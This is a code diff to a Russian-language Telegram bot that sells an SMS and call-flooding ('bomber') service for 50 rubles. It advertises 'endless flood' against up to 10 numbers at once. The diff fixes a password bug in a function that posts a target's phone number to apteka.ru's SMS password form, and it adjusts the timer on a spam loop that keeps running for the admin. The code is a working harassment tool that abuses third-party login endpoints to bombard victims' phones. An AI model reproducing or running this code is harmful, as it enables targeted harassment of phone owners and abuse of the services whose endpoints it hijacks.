@@ -120,7 +120,8 @@ def start(message):
         keyboard.add(*buttons_to_add)
 
     bot.send_message(message.chat.id,
-                     f'❤ Премиум доступ  - 50Р\n - 120 Сервисов \n Бесконечный флуд \n Доступ НАВСЕГДА \n Запускайте флуд сразу на 10 НОМЕРОВ\n 🙎За покупкой - @viannedi \n Или \n\n Перейдите по ссылке для оплаты \n❗️Обязательно введите коментарий: <code>{message.chat.id}</code>', parse_mode='html', reply_markup=keyboard)
+                     f'❤ Премиум доступ  - 50Р\n - 120 Сервисов \n Бесконечный флуд \n Доступ НАВСЕГДА \n Запускайте флуд сразу на 10 НОМЕРОВ\n 🙎За покупкой - @viannedi \n Или \n\n Перейдите по ссылке для оплаты \n❗️Обязательно введите коментарий: <code>{message.chat.id}</code>',
+                     parse_mode='html', reply_markup=keyboard)
 
     save_chat_id(message.chat.id)
 
@@ -918,7 +919,7 @@ def send_for_number(phone):
             requests.post('https://apteka.ru/_action/auth/getForm/',
                           data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                 "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
-                                "form[PASSWORD]": self.password, "get-new-password": "Получите пароль по SMS",
+                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                 "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                 "utc_offset": "120", })
             print('[+] Apteka отправлено!')
@@ -961,7 +962,7 @@ def start_spam(chat_id, phone_number, force):
         msg = f'‍Номер телефона: {phone_number}\nТаймер: ~Бесконечно\nСпам успешно начался!'
 
     bot.send_message(chat_id, msg)
-    end = datetime.now() + timedelta(minutes=1000)
+    end = datetime.now() + timedelta(minutes=50)
     while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
         if chat_id not in running_spams_per_chat_id:
             break
